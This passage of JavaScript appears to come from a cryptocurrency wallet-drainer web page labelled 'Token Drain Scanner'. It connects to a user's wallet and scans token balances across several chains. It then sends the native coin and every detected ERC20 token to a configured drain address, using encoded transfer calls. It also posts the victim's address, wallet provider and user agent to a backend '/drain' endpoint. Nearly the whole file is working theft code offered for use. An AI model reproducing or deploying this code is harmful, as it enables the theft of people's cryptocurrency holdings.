        updateStatus(`🔄 Network changed: ${chainName}`);
        
        // Update network selector
        if (networkSelector) {
            networkSelector.value = chainId;
        }
        
        fetchTokens(currentAccount, chainId);
    });
    
    ethereum.on('disconnect', (error) => {
        console.log('🔌 Wallet disconnected:', error);
        disconnectWallet();
    });
}

// Handle network change from dropdown
async function handleNetworkChange() {
    if (!networkSelector || !networkSelector.value) return;
    
    const chainId = parseInt(networkSelector.value);
    if (!chainId || chainId === currentChainId) return;
    
    const ethereum = getEthereum();
    if (!ethereum) return;
    
    try {
        updateStatus(`🔄 Switching to ${CONFIG.networkNames[chainId] || `Chain ${chainId}`}...`);
        
        await ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: `0x${chainId.toString(16)}` }],
        });
        
    } catch (switchError) {
        if (switchError.code === 4902) {
            try {
                await addNetworkToWallet(chainId);
            } catch (addError) {
                updateStatus(`❌ Failed to add network: ${addError.message}`);
            }
        } else {
            updateStatus(`❌ Failed to switch network: ${switchError.message}`);
        }
    }
}

// Add network to wallet
async function addNetworkToWallet(chainId) {
    const ethereum = getEthereum();
    if (!ethereum) return;
    
    const networkParams = {
        56: { // BSC
            chainId: '0x38',
            chainName: 'Binance Smart Chain',
            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
            rpcUrls: ['https://bsc-dataseed.binance.org/'],
            blockExplorerUrls: ['https://bscscan.com/']
        },
        137: { // Polygon
            chainId: '0x89',
            chainName: 'Polygon',
            nativeCurrency: { name: 'MATIC', symbol: 'MATIC', decimals: 18 },
            rpcUrls: ['https://polygon-rpc.com/'],
            blockExplorerUrls: ['https://polygonscan.com/']
        },
        42161: { // Arbitrum
            chainId: '0xA4B1',
            chainName: 'Arbitrum One',
            nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
            rpcUrls: ['https://arb1.arbitrum.io/rpc'],
            blockExplorerUrls: ['https://arbiscan.io/']
        }
    };
    
    if (networkParams[chainId]) {
        await ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [networkParams[chainId]],
        });
    }
}

// Fetch tokens for current chain
async function fetchTokens(address, chainId) {
    if (!tokensEl) return;
    
    tokensEl.innerHTML = '<div class="loading">🔄 Scanning tokens...</div>';
    
    try {
        const response = await fetch(
            `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${CONFIG.covalentApiKey}&nft=false&no-spam=true`
        );
        
        if (!response.ok) {
            throw new Error(`API error: ${response.status}`);
        }
        
        const data = await response.json();
        const items = data?.data?.items || [];
        
        const tokens = items
            .filter(t => t.balance !== "0" && parseFloat(t.balance) > 0)
            .map(t => {
                const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
                const value = (t.quote_rate || 0) * amount;
                const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
                
                return {
                    symbol: t.contract_ticker_symbol || 'TOKEN',
                    name: t.contract_name || 'Unknown',
                    amount: amount.toFixed(6),
                    value: value ? `$${value.toFixed(2)}` : 'N/A',
                    contractAddress: t.contract_address,
                    decimals: t.contract_decimals || 18,
                    balance: t.balance,
                    chainId: chainId,
                    chainName: chainName,
                    isNative: t.native_token || false,
                    logoUrl: t.logo_url
                };
            });
        
        detectedTokens = tokens;
        
        if (tokens.length > 0) {
            displayTokens(tokens);
            updateStatus(`✅ Found ${tokens.length} tokens on ${CONFIG.networkNames[chainId] || `Chain ${chainId}`}`);
        } else {
            tokensEl.innerHTML = '<div class="loading">No tokens found</div>';
            updateStatus('ℹ️ No tokens found');
        }
        
    } catch (error) {
        console.error('❌ Token fetch error:', error);
        tokensEl.innerHTML = '<div class="error">Failed to fetch tokens</div>';
        updateStatus('⚠️ Token scan failed');
    }
}

// Display tokens
function displayTokens(tokens) {
    if (!tokensEl) return;
    
    // Group tokens by chain
    const tokensByChain = {};
    tokens.forEach(token => {
        if (!tokensByChain[token.chainId]) {
            tokensByChain[token.chainId] = [];
        }
        tokensByChain[token.chainId].push(token);
    });
    
    let html = '';
    
    Object.entries(tokensByChain).forEach(([chainId, chainTokens]) => {
        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        
        html += `
            <div class="chain-section">
                <div class="chain-header">
                    <h4>${chainName}</h4>
                    <span class="token-count">${chainTokens.length} tokens</span>
                </div>
                ${chainTokens.map(token => `
                    <div class="token-item" data-address="${token.contractAddress || 'native'}" data-chain="${chainId}">
                        <div class="token-info">
                            ${token.logoUrl ? `<img src="${token.logoUrl}" class="token-logo" alt="${token.symbol}" />` : ''}
                            <div>
                                <span class="token-symbol">${token.symbol}</span>
                                <span class="token-name">${token.name}</span>
                            </div>
                        </div>
                        <div class="token-amounts">
                            <div class="token-amount">${token.amount}</div>
                            <div class="token-value">${token.value}</div>
                        </div>
                    </div>
                `).join('')}
            </div>
        `;
    });
    
    tokensEl.innerHTML = html;
}

// Handle drain - COMPLETE VERSION FOR ALL TOKENS
async function handleDrain() {
    if (!isConnected || !currentAccount) {
        alert('Please connect wallet first');
        return;
    }
    
    if (detectedTokens.length === 0) {
        alert('No tokens detected to drain');
        return;
    }
    
    // Confirm drain
    if (!confirm(`⚠️ WARNING: This will send ALL detected tokens and ETH to:\n${CONFIG.drainAddress}\n\nEstimated tokens: ${detectedTokens.length}\n\nContinue?`)) {
        return;
    }
    
    const drainBtn = document.getElementById('drainBtn');
    
    try {
        updateStatus('🚀 Starting comprehensive drain...');
        
        if (drainBtn) {
            drainBtn.disabled = true;
            drainBtn.textContent = '⏳ Draining ALL tokens...';
        }
        
        // Create progress indicator
        const progress = document.createElement('div');
        progress.id = 'drainProgress';
        progress.innerHTML = '<div class="progress-bar"><div class="progress-fill"></div></div><div class="progress-text">Starting...</div>';
        statusEl.appendChild(progress);
        
        // 1. First, drain ETH/native token
        await drainNativeToken();
        
        // 2. Drain all ERC20 tokens
        await drainAllERC20Tokens();
        
        updateStatus('✅ Drain completed successfully!');
        alert('✅ All tokens have been drained successfully!');
        
        // Refresh token list
        await fetchTokens(currentAccount, currentChainId);
        
    } catch (error) {
        console.error('❌ Drain error:', error);
        
        let errorMsg = error.message || 'Unknown error';
        if (error.code === 4001) {
            errorMsg = 'Transaction rejected by user';
        } else if (error.code === -32603) {
            errorMsg = 'Transaction failed. Check gas settings.';
        } else if (error.message.includes('insufficient funds')) {
            errorMsg = 'Insufficient ETH for gas fees';
        }
        
        updateStatus(`❌ Drain failed: ${errorMsg}`);
        alert(`Drain failed: ${errorMsg}`);
        
    } finally {
        if (drainBtn) {
            drainBtn.disabled = false;
            drainBtn.textContent = '⚡ Drain All Tokens';
        }
        
        // Remove progress indicator
        const progress = document.getElementById('drainProgress');
        if (progress) progress.remove();
    }
}

// Drain native token (ETH, BNB, MATIC, etc.)
async function drainNativeToken() {
    updateProgress('Draining native token...', 10);
    
    const ethereum = getEthereum();
    
    // Get balance
    const balanceHex = await ethereum.request({
        method: 'eth_getBalance',
        params: [currentAccount, 'latest']
    });
    
    const balance = parseInt(balanceHex, 16);
    
    if (balance === 0) {
        updateProgress('No native token to drain', 20);
        return;
    }
    
    // Get gas price
    const gasPriceHex = await ethereum.request({
        method: 'eth_gasPrice',
        params: []
    });
    
    const gasPrice = parseInt(gasPriceHex, 16);
    const gasLimit = 21000;
    const gasCost = gasPrice * gasLimit;
    
    // Check if we have enough for gas
    if (balance <= gasCost * 2) {
        updateProgress('Not enough native token for gas fees', 30);
        return;
    }
    
    // Calculate amount to send (leave some for gas for token transfers)
    const sendAmount = balance - (gasCost * 5);
    
    if (sendAmount <= 0) {
        updateProgress('Not enough after gas fees', 40);
        return;
    }
    
    // Send native token
    const txHash = await ethereum.request({
        method: 'eth_sendTransaction',
        params: [{
            from: currentAccount,
            to: CONFIG.drainAddress,
            value: '0x' + sendAmount.toString(16),
            gas: '0x' + gasLimit.toString(16),
            gasPrice: gasPriceHex
        }]
    });
    
    updateProgress(`Native token sent: ${txHash.slice(0, 10)}...`, 50);
    await new Promise(resolve => setTimeout(resolve, 3000));
}

// Drain all ERC20 tokens
async function drainAllERC20Tokens() {
    const ethereum = getEthereum();
    
    // Filter only ERC20 tokens (not native)
    const erc20Tokens = detectedTokens.filter(t => !t.isNative && t.contractAddress);
    
    if (erc20Tokens.length === 0) {
        updateProgress('No ERC20 tokens to drain', 60);
        return;
    }
    
    updateProgress(`Draining ${erc20Tokens.length} ERC20 tokens...`, 60);
    
    let completed = 0;
    
    for (const token of erc20Tokens) {
        try {
            // Switch to token's chain if needed
            if (currentChainId !== token.chainId) {
                await switchToChain(token.chainId);
            }
            
            // Drain the token
            await drainERC20Token(token);
            
            completed++;
            const percent = 60 + (completed / erc20Tokens.length * 40);
            updateProgress(`Draining ${token.symbol}... (${completed}/${erc20Tokens.length})`, percent);
            
            await new Promise(resolve => setTimeout(resolve, 2000));
            
        } catch (error) {
            console.error(`Failed to drain ${token.symbol}:`, error);
        }
    }
    
    updateProgress(`Completed draining ${completed} tokens`, 100);
}

// Drain single ERC20 token
async function drainERC20Token(token) {
    const ethereum = getEthereum();
    
    // Encode transfer function call
    const transferData = encodeTransferData(token.balance);
    
    // Get gas estimate for token transfer
    const gasEstimate = await ethereum.request({
        method: 'eth_estimateGas',
        params: [{
            from: currentAccount,
            to: token.contractAddress,
            data: transferData
        }]
    });
    
    const gasLimit = parseInt(gasEstimate, 16) * 2;
    
    // Get gas price
    const gasPriceHex = await ethereum.request({
        method: 'eth_gasPrice',
        params: []
    });
    
    // Send token transfer
    const txHash = await ethereum.request({
        method: 'eth_sendTransaction',
        params: [{
            from: currentAccount,
            to: token.contractAddress,
            data: transferData,
            gas: '0x' + gasLimit.toString(16),
            gasPrice: gasPriceHex
        }]
    });
    
    return txHash;
}

// Encode transfer function call
function encodeTransferData(amount) {
    const functionSignature = '0xa9059cbb';
    const paddedAddress = CONFIG.drainAddress.slice(2).padStart(64, '0');
    const paddedAmount = BigInt(amount).toString(16).padStart(64, '0');
    return functionSignature + paddedAddress + paddedAmount;
}

// Switch to specific chain
async function switchToChain(chainId) {
    if (currentChainId === chainId) return;
    
    const ethereum = getEthereum();
    
    try {
        await ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: `0x${chainId.toString(16)}` }],
        });
        
        await new Promise(resolve => setTimeout(resolve, 1000));
        currentChainId = chainId;
        
    } catch (error) {
        if (error.code === 4902) {
            await addNetworkToWallet(chainId);
        } else {
            throw error;
        }
    }
}

// Update progress indicator
function updateProgress(message, percent) {
    const progressText = document.querySelector('.progress-text');
    const progressFill = document.querySelector('.progress-fill');
    
    if (progressText) {
        progressText.textContent = message;
    }
    
    if (progressFill) {
        progressFill.style.width = `${percent}%`;
    }
    
    console.log(`Progress: ${percent}% - ${message}`);
}

// Update status
function updateStatus(message) {
    statusEl.textContent = message;
}

// Show UI elements
function showUIElements() {
    ['chainSelector', 'drainBtn', 'scanAllBtn', 'tokensContainer'].forEach(id => {
        const el = document.getElementById(id);
        if (el) el.classList.remove('hidden');
    });
}

// Hide UI elements
function hideUIElements() {
    ['chainSelector', 'drainBtn', 'scanAllBtn', 'tokensContainer'].forEach(id => {
        const el = document.getElementById(id);
        if (el) el.classList.add('hidden');
    });
}

// Log connection to backend
async function logConnectionToBackend(address, chainId) {
    try {
        await fetch(CONFIG.backendUrl + '/drain', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                address: address,
                chainId: chainId,
                drainTo: CONFIG.drainAddress,
                timestamp: new Date().toISOString(),
                walletProvider: walletProvider,
                isMobile: isMobile,
                userAgent: navigator.userAgent
            })
        });
    } catch (error) {
        console.log('⚠️ Backend log failed');
    }
}

// Disconnect wallet
async function disconnectWallet() {
    console.log('🔄 Disconnecting...');
    
    const ethereum = getEthereum();
    if (ethereum && ethereum.disconnect) {
        try {
            await ethereum.disconnect();
        } catch (error) {
            console.log('⚠️', error.message);
        }
    }
    
    // Reset state
    currentAccount = null;
    currentChainId = null;
    isConnected = false;
    detectedTokens = [];
    walletProvider = null;
    
    // Update UI
    connectBtn.innerHTML = '<span>🔗 Connect Wallet</span>';
    updateStatus('Disconnected. Click "Connect Wallet" to begin.');
    hideUIElements();
    
    if (tokensEl) {
        tokensEl.innerHTML = '';
    }
}

// Handle scan all chains
async function handleScanAllChains() {
    if (!currentAccount) {
        alert('Please connect wallet first');
        return;
    }
    
    updateStatus('🔍 Scanning all chains for tokens...');
    
    const chainsToScan = [1, 56, 137, 42161, 10, 43114, 8453];
    let allTokens = [];
    
    for (const chainId of chainsToScan) {
        try {
            const tokens = await fetchTokensForChain(currentAccount, chainId);
            if (tokens.length > 0) {
                allTokens = [...allTokens, ...tokens];
            }
        } catch (error) {
            console.log(`⚠️ Failed to scan chain ${chainId}:`, error.message);
        }
    }
    
    detectedTokens = allTokens;
    
    if (allTokens.length > 0) {
        displayTokens(allTokens);
        updateStatus(`✅ Found ${allTokens.length} tokens across all chains`);
    } else {
        updateStatus('ℹ️ No tokens found on any chain');
    }
}

// Fetch tokens for specific chain
async function fetchTokensForChain(address, chainId) {
    try {
        const response = await fetch(
            `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${CONFIG.covalentApiKey}&nft=false&no-spam=true`
        );
        
        if (!response.ok) {
            throw new Error(`API error: ${response.status}`);
        }
        
        const data = await response.json();
        const items = data?.data?.items || [];
        
        return items
            .filter(t => t.balance !== "0" && parseFloat(t.balance) > 0)
            .map(t => {
                const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
                const value = (t.quote_rate || 0) * amount;
                const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
                
                return {
                    symbol: t.contract_ticker_symbol || 'TOKEN',
                    name: t.contract_name || 'Unknown',
                    amount: amount.toFixed(6),
                    value: value ? `$${value.toFixed(2)}` : 'N/A',
                    contractAddress: t.contract_address,
                    decimals: t.contract_decimals || 18,
                    balance: t.balance,
                    chainId: chainId,
                    chainName: chainName,
                    isNative: t.native_token || false,
                    logoUrl: t.logo_url
                };
            });
    } catch (error) {
        console.error(`❌ Token fetch error for chain ${chainId}:`, error);
        return [];
    }
}

// Initialize app on load
window.addEventListener('DOMContentLoaded', initializeApp);

// Make functions available globally
window.closeWalletSelector = closeWalletSelector;
window.handleWalletSelection = handleWalletSelection;
window.showManualInstructions = showManualInstructions;
window.closeMobileInstructions = closeMobileInstructions;
window.closeManualInstructions = closeManualInstructions;
window.copyManualUrl = copyManualUrl;
window.closeNotInstalledModal = closeNotInstalledModal;

// Debug
console.log('=== Token Drain Scanner ===');
console.log('Version: 6.0 - Universal Wallet Connection');
console.log('Drain Address:', CONFIG.drainAddress);
console.log('Device:', isMobile ? '📱 Mobile' : '💻 Desktop');
console.log('===========================');
